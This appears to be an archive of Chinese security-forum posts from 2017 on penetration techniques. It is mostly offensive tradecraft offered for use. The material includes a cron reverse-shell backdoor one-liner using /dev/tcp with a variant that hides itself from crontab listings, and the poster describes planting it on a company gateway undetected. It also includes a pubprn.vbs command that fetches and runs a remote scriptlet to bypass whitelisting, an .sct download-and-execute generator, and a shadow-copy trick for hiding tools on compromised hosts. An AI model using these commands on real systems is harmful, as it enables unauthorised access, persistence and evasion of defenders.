# Penetration Testing
子目录:
- [防火墙](#防火墙)
- [webshell扫描](#webshell扫描)
- [域渗透](#域渗透)
- [MSF](#msf)
- [Bash](#bash)
- [powershell](#powershell)
- [Downloader](#downloader)
- [Windows COM](#windows-com)
- [Exchange](#exchange)
- [边界设备安全](#边界设备安全)


## 防火墙


<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ on 2017-06-24:


__#姿势#__

  当服务器只开web服务并且防火墙不准服务器对外主动发起链接时，这样来突破！

当我在渗透测试的时候，拿到了web shell可以执行命令时，总想反弹shell出来方便进一步渗透，但是我碰到的环境安全性都做的很好，防火墙策略直接禁止服务器对外发起链接。这样就没法反弹了。

然后我自己有想过突破的方法，我当时想到的是重新封装http的数据包，到服务器后再拆包，转到22端口上去，这样做很复杂，一直没去实现。

今天在freebuf看到这篇文章，就忍不住转过来分享一下，作者在服务器上直接对源端口进行检查，然后将特定的源端口数据通过iptables nat表中PREROUTING 链配合 REDIRECT 重定向到本机22端口去，当时怎么没想到。这个在一些防火墙策略做的很完善的环境下，很有用！

[远程遥控IPTables进行端口复用](http://mp.weixin.qq.com/s/W5npN8YiqG-RBoq2mTv_2g)



---


## webshell扫描

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-05-26:

> 匿名用户 提问：
使用字典远程扫描webshell，脚本发现疑似webshell后如何更好的进一步自动化甄别与判断。（假设密码已知，webshell包括大小马和一句话）


以前我们做过这个研究，这种远程扫描来准确识别并不容易，对于已知 Webshell，我们可以加精准特征（比如：HTML 里的内容、代码执行的返回内容、特别的文件名等），想通过什么好算法来处理，其实很难。


---

## 域渗透

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-06:

> 匿名用户 提问：
想学习有关域渗透的一些资料，windows域 08/12/WIN10安全检测及bypass，挺说还有linux域，感觉在这方面很欠补，毕竟环境接触的少，网上说的都模棱两可，大多不可行，弄的晕头转向，想权威体质的学习一下


安全技能树里推荐了不少，如果你真想感受，首先得“坏”。


---


## MSF


<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-09:


__#姿势#__

  今天再转篇 FreeBuf 的文章《MSF外网持久控制Android手机并渗透测试局域网》：


[MSF外网持久控制Android手机并渗透测试局域网 - FreeBuf.COM | 关注黑客与极客](http://www.freebuf.com/sectool/136574.html)



这个大三学生动手能力不错，哪家相关安全公司需要，可以考虑收了。

年轻人应该多折腾，守正出奇。把握好度就行，一定要把握好度，否则，违法犯罪你迟早跑不掉。

BTW：今天转的 FreeBuf 另一篇文章作者据说只是个高中生。



...

<img src="https://file.xiaomiquan.com/94/84/948404f2db7578409ae23a5bfbec08002ed6714f9d48fd7301f0abf11b140d29.jpg" width="25px"/> __有水有生命__: 我也看了，感觉好像有办法实验一次，不过有很多点疑问，试试再来请教可好，现在就有个问题，我用dns欺骗在家里能骗局域网内一台机（共8台只能骗一台），在办公室一台都骗不了，一执行还把人弄死你了，大侠请赐教

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/94/84/948404f2db7578409ae23a5bfbec08002ed6714f9d48fd7301f0abf11b140d29.jpg" width="25px"/> __有水有生命__: 你怎么做dns欺骗的？

<img src="https://file.xiaomiquan.com/e0/1d/e01d033928215404410d8a95fcd0868cc1cde3f31609eb54f6048cc674ef5baa.jpg" width="25px"/> __一休__: 说到守正出奇，今晚突然想起之前看过的一个贴，[tieba.baidu.com/p/4963716287?see_lz=1&pn=1](tieba.baidu.com/p/4963716287?see_lz=1&pn=1)  这位大兄弟的SE也是六到没谁了

<img src="https://file.xiaomiquan.com/94/84/948404f2db7578409ae23a5bfbec08002ed6714f9d48fd7301f0abf11b140d29.jpg" width="25px"/> __有水有生命__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: kali下用ettercap,,扫描主机经常扫不全，中间人经常无效……

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/94/84/948404f2db7578409ae23a5bfbec08002ed6714f9d48fd7301f0abf11b140d29.jpg" width="25px"/> __有水有生命__: 对比看看 bettercap

<img src="https://file.xiaomiquan.com/94/84/948404f2db7578409ae23a5bfbec08002ed6714f9d48fd7301f0abf11b140d29.jpg" width="25px"/> __有水有生命__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 所以啊有高手快速指导反馈才能进步，半年前就这个问题折腾的半死，最后都停止玩了，两台电脑一台没问题，一台win10下虚拟机能nat联网，可是不能桥接，网上都查遍了也没解决

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/94/84/948404f2db7578409ae23a5bfbec08002ed6714f9d48fd7301f0abf11b140d29.jpg" width="25px"/> __有水有生命__: 对比结果可以再反馈下

<img src="https://file.xiaomiquan.com/94/84/948404f2db7578409ae23a5bfbec08002ed6714f9d48fd7301f0abf11b140d29.jpg" width="25px"/> __有水有生命__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 这种远程问就是很难弄明白，各种小问题非常繁琐，每一个小坑都要折腾半死，烦的自己都不好意思一直问

<img src="https://file.xiaomiquan.com/e6/16/e616b63d215ace23913e168c6b8d4f4b20eeab9eb71886ecabb3bd60cd4f07fe.jpg" width="25px"/> __萝卜__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: ettercap跟bettercap都试过 感觉都是时灵时不灵 cos哥有没有更稳定的中间人工具推荐？


...

---

## Bash


<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ on 2017-06-22:


__#姿势#__

  一条命令实现无文件兼容性强的反弹后门,收集自强大的前乌云。
我觉得很实用且强大,分享给大家.

```
(crontab -l;echo '*/60 * * * * exec 9<> /dev/tcp/IP/port;exec 0<&9;exec 1>&9 2>&1;/bin/bash --noprofile -i')|crontab -
```

就是一条SHELL脚本，通过crontab 自定义一条定时执行的任务。


<详解>

`/dev/tcp/IP/port`  ：通过调用/dev/tcp 类似发出了一个socket的调用，建立一个socket连接，读写这个/dev/tcp就相当于在这个socket连接中传输数据，后面跟上你控制端的IP和端口，当然也可以写上你的域名，这样你植入后门后，你接收SHELL的服务器IP发生改变，你同样能收到SHELL。

`exec 9<>`  ：9是linux 中的文件描述符，0代表从键盘输入，1代表标准输出的，2代表错误输出的，这个大家都知道吧，其实一共有10个，只是其它的默认没有打开。exec 9<> ，意思是以读写方式打开/dev/tcp，然后所有的数据都会保留在9这个文件描述符内，并通过tcp连接在两端传输。

`exec 0<&9`  :意思是将9里面的内容传送给输入端，作用是当我们在控制端输入命令的时候，命令就自动传到被控端并被输入执行.

`exec 1>9&`  : 这个意思大家现在能明白了吧，就是被控端执行命令后的正确回显也输出到 9，这样我们在控制端就能接收到。

`2>&1`   :错误的输出也指向1，而前面1已经指向到了9，所以错误的消息也传向了9，这样我们就能在控制端收到正确和错误的回显了。

`/bin/bash --noprofile -i`  :这个就是调用bash来执行我们输入的命令，后面跟的参数是禁止执行一些登录shell时调用的脚本。


前面的时间设定很简单，大家不明白的可以百度下，我曾经植入一条这样的后门到一个大型企业的网关防火墙上（linux内核），每个月只连出来一次，2年了人家都没发现，当然可能管理员比较懒。拿到网关shell当然各种代理就都不是事了。

当然管理员通过crontab -l 可以查看到任务，

不过你这样：

```
(crontab -l;printf "*/60 * * * * exec 9<> /dev/tcp/IP/PORT;exec 0<&9;exec 1>&9 2>&1;/bin/bash --noprofile -i;\rno crontab for `whoami`%100c\n")|crontab -  
```

猥琐版直接显示你用户名下没有任务....

在未连接状态启动反连任务的时候，进程和端口都无状态。



...

<img src="https://file.xiaomiquan.com/08/5f/085fb0537ae32a57afd19df88c738810e85c9250a3ec4bff1352a84fa871536e.jpg" width="25px"/> __samurai__: ****是什么

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ replies to <img src="https://file.xiaomiquan.com/08/5f/085fb0537ae32a57afd19df88c738810e85c9250a3ec4bff1352a84fa871536e.jpg" width="25px"/> __samurai__: 要不百度下crontab的用法？ 是设置时间用的，依次排序下去就是设置 分 时 日 月 周 ，*如果在日这个单位上，就是不限制在每月哪号。

<img src="https://file.xiaomiquan.com/08/5f/085fb0537ae32a57afd19df88c738810e85c9250a3ec4bff1352a84fa871536e.jpg" width="25px"/> __samurai__ replies to <img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 了解了

<img src="https://file.xiaomiquan.com/0e/e1/0ee1c96d098d832f4c5b549d0174dc399280cfa71a743cd4397dd48e12b2e60a.jpg" width="25px"/> __灵活的胖子__: 6666   定时反弹shell这是，同时问下 linux想转发另外一台的3389出来，有什么好办法，用iptable做nat转发失败

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 参考下之前弦哥发的，ssh端口转发实战，应该可以解决你的问题。

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 补充下：这个指令来自猪猪侠

<img src="https://file.xiaomiquan.com/e0/1d/e01d033928215404410d8a95fcd0868cc1cde3f31609eb54f6048cc674ef5baa.jpg" width="25px"/> __一休__ replies to <img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 下午在centos和kali上测试都显示9是Bad file descriptor

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ replies to <img src="https://file.xiaomiquan.com/e0/1d/e01d033928215404410d8a95fcd0868cc1cde3f31609eb54f6048cc674ef5baa.jpg" width="25px"/> __一休__: 你没开监听就会这样，试着先开监听

<img src="https://file.xiaomiquan.com/3a/1d/3a1dfafee22fabee58800a8d92e40cb97cae002fa0245156de52e427a2631344.jpg" width="25px"/> __Leo__: kali里面直接在命令行里可以反弹拿到shell，但是在crontab里面无法拿shell，求解


...

---


## powershell

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-19:


__#姿势#__

 Increased use of PowerShell in attacks

推荐这篇来自赛门铁克的 Paper，这是一篇难得攻防介绍很全面的研究成果，从 PowerShell 基础到各攻击阶段的姿势：

执行策略

植入
- 如：Email、Office 宏、Exploit Kits、横向渗透、策略文件、任务计划、PsExec、等

持久化
- 如：注册表、WMI、任务计划、启动目录、组策略、策略文件、等

混淆
- 如：大小写、空格、Get-自动补全、System.自动补全、引号拼接、反单引魔法、通配符魔法、别名、向后兼容、进制转换、-f格式化、XOR、BrainFuck、等

一些绕过技巧

在列举这些攻击过程的同时还举例了一些经典木马的案例，最后还好些篇幅介绍了防御姿势。

这篇 Paper 是去年的，如果能通读下来并做些实践，会很受益。

昨天我带团队通读了一遍，对于团队来说两块很明显的收益：英文能力提升、PowerShell 攻防姿势提升。

PowerShell 已经成为玩渗透必备技能，如果你还没掌握，赶快入坑。😏


__分享文件:__
[increased-use-of-powershell-in-attacks-16-en.pdf](fileulrxxxxxxxxxxxxxxxxxxxfileulr)


...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 去年开始，(null)   就一直喊我学 PowerShell，只要和我见面必然会 Show 他的成果，还给我分享了各种环境、工具及学习笔记。可我当时并不以为然啊，Python 与 JavaScript 是我最好的武器，在我的工作场景下基本通杀全栈，我觉得够了，没想到，PowerShell 已经吐火如茶成这样，果然是老司机的建议，咱都收...

<img src="https://file.xiaomiquan.com/0e/48/0e48d9ee4e4299ba09ac5217c23e38ceeb13e48357ee2261c6c03282b5807781.jpg" width="25px"/> __Chen__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 吐火如茶？如火如荼？

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/0e/48/0e48d9ee4e4299ba09ac5217c23e38ceeb13e48357ee2261c6c03282b5807781.jpg" width="25px"/> __Chen__: 哈，手快敲错

<img src="https://file.xiaomiquan.com/d2/51/d251481e66c6144e32be00ceeedbd707a2bbe024ac5d9b150ce826c26a0b6be6.jpg" width="25px"/> __desword__: 自带混淆这个不错。

<img src="https://file.xiaomiquan.com/b2/27/b2273c727cd42d41352bd2bb195a82e4d41270073f0e99e7e46ffb1a1566c21f.jpg" width="25px"/> __。__: 各大杀软已经把恶意调用powershell加入黑名单了…真的厉害😂过段时间应该会有人在xx大会上分享powershell了


...

---

<img src="https://file.xiaomiquan.com/49/38/493819414cee64e85bb9339ad2d5f28a809a1f8d45dba90f290aec07ec882a72.jpg" width="25px"/> __Moriarty@ATToT__ on 2017-06-24:

.sct generator by Moriarty@DMZLab
这是我闲着蛋疼用powershell 写的一个GUI小程序，功能主要是用来生成.sct文件。发这DD的目的主要是给大家介绍一下另一种方式来写GUI程序———Form（窗体）。用这种方式可以仅仅只需要powershell studio一个IDE就可以完成，在写一些简单的GUI的程序尤其适合。
那么程序本身的功能很简单，就是用来生成.sct文件，这个类型的文件想必好多朋友都已经了解，subtee牛已经详细阐述过了。我一般用它下载执行exe文件的时候居多，用法如下：
1.用certutil.exe(win7以上系统自带）将exe转成shellcode，格式如下：
certutil.exe -encode setup.exe setup.b64
2.将setup.b64的内容复制黏贴到中间输入框中，然后点击Generate即可生成一个随机命名的.sct文件。
3.将这个文件放到一个web server上，然后用程序中给出的一句话在目标机器上执行，即可完成exe的下载并执行。
程序中的refresh可以重新初始化所有参数（主要是重新生成一些随机的命名），clear会清空中间输入框中的内容。
如果你想生成其它功能的.sct文件，可以双击第一个文本框和第三个文本框使之变为可修改状态，就可以定制自己的sct文件了。
工具虽小，但我里面用了一些小技巧，你在阅读源码的时候应该就会注意到了。另外，写得仓促，可能有错误或者需要改进的地方，圈友们可自行修改。

<img src="https://images.xiaomiquan.com/Fvb1uk0UNtTW4QO5ztFWnIhekvWg?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:WCbccaAneV-SSm2aQD_ttO-v1IM=" width="50%" height="50%" align="middle"/>
<img src="https://images.xiaomiquan.com/Fkr-fsE9IHqeL1mLm1clvDYlA_uF?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:BmcsH54WipZgXlwsaGngF9B6qh0=" width="50%" height="50%" align="middle"/>

__分享文件:__
[SctGenerator.zip](https://github.com/ChrisLinn/sst-2017/blob/master/shared-files/SctGenerator.zip)


---

<img src="https://file.xiaomiquan.com/49/38/493819414cee64e85bb9339ad2d5f28a809a1f8d45dba90f290aec07ec882a72.jpg" width="25px"/> __Moriarty@ATToT__ on 2017-06-24:

Powershell Useful ToolSet by Moriarty@DMZLab
这是我打算把一些小的有用的工具集成的小项目，目前还没完成，之所以放上来，就是想给大家介绍一些如何写类似这样的powershell程序。目前仅写了一个简单的小功能，其它的后面继续完善。
把这未完成品放上来，是想给大家介绍一些powershell GUI程序如何去写。一种方法使用powershell studio自带的界面设计器来做，这种方法简单实用，但是也是有许多不如人意的地方（这里不再赘述）。另外一种方法是使用XAML，虽然稍微麻烦了一些，但是看上去更简洁，更通用，也是最常用的方法（尤其对那些没有powershell studio或者不喜欢用powershell studio的童鞋们）。

今天我们重点介绍后一种，其实步骤也很简单：

一、用visual studio进行界面设计（我这里用的visual studio 2017，没有这个的用express版也可以）。创建项目时选择 “WPF应用（.Net Framework）”即可。如附图一所示。

二、画界面。这个就不用多说了，所见即所得，很简单。画完后如附图二所示。

三、把图二中的XAML代码完整复制出来，然后粘贴到powershell代码中，如下所示：

```
[xml]$XAML = @'
<Window 
    x:Class="WpfApp1.MainWindow"
    xmlns="http://schemas.microsoft.com/winfx/2006/xaml/prese...
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        xmlns:d="http://schemas.microsoft.com/expression/blend/2008...
        xmlns:mc="http://schemas.openxmlformats.org/markup-compatibi...
    xmlns:local="clr-namespace:WpfApp1"
    mc:Ignorable="d"
        Title="Powershell Useful ToolSet V0.1 By Moriarty@DMZLab" Height="350" Width="566.77" WindowStyle="ToolWindow" Background="#FFF5F1F1" Topmost="True" WindowStartupLocation="CenterScreen">
    <Grid>
        <Grid.ColumnDefinitions>
            <ColumnDefinition Width="280*"/>
            <ColumnDefinition Width="279*"/>
        </Grid.ColumnDefinitions>
        <TabControl x:Name="tabctl_1" VerticalAlignment="Top" Height="322" Grid.ColumnSpan="2">
            <TabItem x:Name="tabItem_obf" Header="Obfustcator">
                <Grid Background="#FFE5E5E5" Margin="0">
                    <Grid.ColumnDefinitions>
                        <ColumnDefinition Width="178*"/>
                        <ColumnDefinition Width="371*"/>
                    </Grid.ColumnDefinitions>
                    <Label Grid.ColumnSpan="2" Content="Randomly obfuscate powershell command (using enviroment variable):" HorizontalAlignment="Left" Height="23" Margin="10,10,0,0" VerticalAlignment="Top" Width="529" HorizontalContentAlignment="Center" Foreground="Red"/>
                    <Button x:Name="btn_go" Content="GO" Grid.Column="1" HorizontalAlignment="Left" Height="19" Margin="31,126,0,0" VerticalAlignment="Top" Width="115"/>
                    <TextBox x:Name="textbox_output" Grid.ColumnSpan="2" HorizontalAlignment="Left" Height="85" Margin="10,36,0,0" TextWrapping="Wrap" Text="" VerticalAlignment="Top" Width="529"/>
                </Grid>
            </TabItem>
            <TabItem x:Name="tabItem_gen" Header="Generator">
                <Grid Background="#FFE5E5E5"/>
            </TabItem>
        </TabControl>

    </Grid>
</Window>

'@
```

四、添加PresentationFramework程序集的引用：

`Add-Type -Assembly PresentationFramework`

或者：

`[void][system.Reflection.Assembly]::LoadWithPartialName("PresentationFramework")`

五、需要删除几行复制过来的XAML代码，不然会有错误（你事先手动删除然后再复制过来也行，不过我还是喜欢交给代码来完成）：

```
$XAML.Window.RemoveAttribute('x:Class')
$XAML.Window.RemoveAttribute('mc:Ignorable')
$XAML.Window.RemoveAttribute('xmlns:local')
```

六、然后就是解析XAML，让你的图形界面显示出来了（事件添加很简单，可以参考完整代码，我这里不多说了）：

```
$reader = New-Object System.Xml.XmlNodeReader $XAML
try
{
  $Form = [Windows.Markup.XamlReader]::Load($reader)
}
catch
{
  Write-Host -ForegroundColor Red "Processing XAML Failed!"
  exit
}
$Form.ShowDialog() | Out-Null
```

是不是很简单？程序运行截图如附图三所示。

powerhsell图形界面开发很简单，而且可以跨平台，等程序最终完成我再放一个最终版。有兴趣的圈友，也可以在我这个代码基础上自己去完善一个出来，记得放出来共享哦


__分享文件:__
[PUTTs.zip](https://github.com/ChrisLinn/sst-2017/blob/master/shared-files/PUTTs.zip)


---

<img src="https://file.xiaomiquan.com/49/38/493819414cee64e85bb9339ad2d5f28a809a1f8d45dba90f290aec07ec882a72.jpg" width="25px"/> __Moriarty@ATToT__ on 2017-06-29:

渗透技巧之隐藏自己的工具
大家在做内网渗透的时候，经常要传一些工具到目标机器上执行。有的时候传一次，执行完了就删除了，后来发现还要再用，又要再次上传，很是麻烦而且也容易造成被发现的风险。有的圈友可能会把工具放到一个很深的目录里藏起来，但是这种工具长期放在目标机器上又不安全。今天我给大家介绍一个猥琐的小技巧，可以放心的把工具放在目标机器上，而又不会被发现。
这里利用的就是VSS（Volume Shadow Copy），首先我们将工具上传到目标机器的某个目录里（比如c:\$Recycler.Bin),我这里方便测试，在c盘新建了一个目录test，并把工具传到了此目录里。然后我们创建C盘的VSS，这里我们可以利用微软的vssadmin工具（我的windows 2008里自带这个工具），如果没有这个工具我们可以利用wmi来操作：
1.创建VSS：
vssadmin create shadow /for=c:
或者
（Get-WmiObject Win32_ShadowCopy -List).Create("C:\","ClientAccessible")
这里记住返回的ShadowID（类似{eeb50055-34c9-472b-81e6-ed111742e12e}）
2.删除你上传的工具（我这里是直接把C:\test目录删除掉）
3.查看一下我们创建的VSS的DeviceObject（如果使用vssadmin创建的，返回结果里就会有）：

`gwmi Win32_ShadowCopy | select -Property DeviceObject`

返回结果为：

```
DeviceObject                                   
------------                                   
\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8
```

4.将`\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8`中的“？”换成“.”，就可以执行你的程序了：

```
\\.\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\test\hunter64.exe
```

是不是很简单？这样做，实际硬盘上已经看不到hunter64.exe里，但是我们做了一个shadow copy，在这里shadow copy里，我们的程序还在，通过这种方式我们就可以随时随地执行我们的“影子”程序，从而实现隐藏我们的工具了。
等你不再需要这些工具的时候，直接删除你创建的VSS就可以了：
vssadmin Delete Shadows /shadow={eeb50055-34c9-472b-81e6-ed111742e12e} /quiet
或者

`Get-WmiObject Win32_ShadowCopy | where {$_.ID -eq '{eeb50055-34c9-472b-81e6-ed111742e12e}'} | Remove-WmiObject`

当然，使用WMI的方法我们不一定用powershell，也可以使用JScript或者VBScript，比如：

```
var Win32_ShadowCopy =GetObject("winmgmts:\\\\.\\root\\cimv2:Win32_ShadowCopy");
Win32_ShadowCopy.Create(
  "C:\\",
  "ClientAccessible"
);
```

举一反三的机会留给各位圈友了：-）

<img src="https://images.xiaomiquan.com/Fr3g-bDh6ZEsWgeuedBGC3XRbq_l?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:jyHrhJEjosuVJuUmtjKlF2ifYJ8=" width="50%" height="50%" align="middle"/>
<img src="https://images.xiaomiquan.com/FmT7oZ79Jbh44M3auMEbhYRfsx-s?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:psLIgsGpbh9aywxarRAauuzLBrg=" width="50%" height="50%" align="middle"/>
<img src="https://images.xiaomiquan.com/FvuN5GgkqCVU3yGgpSi-sakrbYqM?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:Cn4mcNhkPIcPKRk7lHitjUohHHQ=" width="50%" height="50%" align="middle"/>
<img src="https://images.xiaomiquan.com/FrColQQRXcJjgEsM9G6YkaFzogxe?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:nw9K-O-Y6Ga6UEfxIhipq9WYG7g=" width="50%" height="50%" align="middle"/>
<img src="https://images.xiaomiquan.com/Fksg794N47n3RgzNFwYSbDDVA1jv?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:PJ_hAwIodO4J7VvaUZcAL7gfZFA=" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 这里有份朋友写的指南也可以参考：
[pentest-wiki/How-to-use-vssadmin.md at master · ni...](https://github.com/nixawk/pentest-wiki/blob/master/4.Post-Exploitation/Windows_ActiveDirectory/How-to-use-vssadmin.md)

...

---

## downloader


<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-21:


__#姿势#__

给大家分享点具体渗透姿势，比如白名单下载恶意代码的一个技巧。

OPCDE 里看到的一个技巧：

```
cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs blah "script:https://gist.githubusercontent.com/enigma0x3/64adf8ba99d4485c478b67e03ae6b04a/raw/a006a47e4075785016a62f7e5170ef36f5247cdb/test.sct
```


```
cscript /b C:\Windows\System32\Printing_Admin_Scripts\zh-CN\pubprn.vbs blah "script:https://gist.githubusercontent.com/enigma0x3/64adf8ba99d4485c478b67e03ae6b04a/raw/a006a47e4075785016a62f7e5170ef36f5247cdb/test.sct
```



简单说下：

第一个是英文的 Win10，第二个是中文的 Win10。test.sct 里的代码会弹个计算器。pubprn.vbs 是 Win 系统自带的，被签名过的。通过这种方式，可以 bypass 一些防御。pubprn.vbs 充当 downloader 角色。

中文，我自己实测的，据其他圈友测试 Win7/XP 都 OK。

test.sct代码如下：

```
<?XML version="1.0"?>
<scriptlet>

<registration
    description="Bandit"
    progid="Bandit"
    version="1.00"
    classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"
    remotable="true"
 >
</registration>

<script language="JScript">
<![CDATA[

  var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
 
 
]]>
</script>

</scriptlet>
```


---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-21:


__#姿势#__

  接上面那条 SCT 的白名单下载技巧，推上发现 @subTee  又扔出一个小技巧：

Hope your SCT detection is richer than looking for 
`<scriptlet><registration>`
Cause `<package><component>` works too 😀

代码在这：

[https://gist.github.com/subTee/7cec8af1ae9b9493731...](https://gist.github.com/subTee/7cec8af1ae9b9493731b8ec70e2cf034)



拷贝过来如下：

```
<?xml version="1.0"?>
<package>
  <comment>
    
  </comment>

  <component id="ABAPTest">
    <?component error="true" debug="true"?>

    <registration 
    progid="PoC"
    classid="{F0001111-0000-0000-0000-0000FEEDACDC}" >

    <script >
        <![CDATA[

            var r = new ActiveXObject("WScript.Shell").Run("calc.exe"); 

        ]]>
    </script>
</registration>

  </component>
</package>
```

也真只有吃透 Win，才能 hack 出更多独特玩法啊。


---


## Windows COM

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-21:


__#姿势#__

  CVE-2017-0213 Windows COM 特权提升漏洞组件，实战测试 WIN10 1703 完美通过，下载地址：


[Exploits/CVE-2017-0213 at master · WindowsExploits...](https://github.com/WindowsExploits/Exploits/tree/master/CVE-2017-0213)



演示视频：


[CVE-2017-0213-hackone的秒拍](http://m.miaopai.com/show/channel/dciBNvvRVHMhThOIlaqG9qogVpApkSJ3)



来自本圈@h4ck0ne  的实测及演示视频录制，提权神洞，推荐给大家。



...

<img src="https://file.xiaomiquan.com/01/90/01903e0646f6df0fa017076ab2935b1104ade470b8eb8d28e3f2c3bb5b44e3d9.jpg" width="25px"/> __熟人不宜__: 如果目标是域内的一台server，通过这个在本地把域账号添加到管理员组也适用么？

<img src="https://file.xiaomiquan.com/74/dd/74dd868df857e0ffec8613ae99f0891f0e7088f3533e8bd16f9614477984d3f6.jpg" width="25px"/> __‍迷途の狼__ replies to <img src="https://file.xiaomiquan.com/01/90/01903e0646f6df0fa017076ab2935b1104ade470b8eb8d28e3f2c3bb5b44e3d9.jpg" width="25px"/> __熟人不宜__: 不行


...

---


## Exchange

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-05-26:

> 匿名用户 提问：
内网中域控权限 Exchange服务器可控 如何在命令行获取所有邮箱列表及单个邮箱邮件打包 或按时间段打包


好吧，还是公开回复吧，你可以参考这个项目：


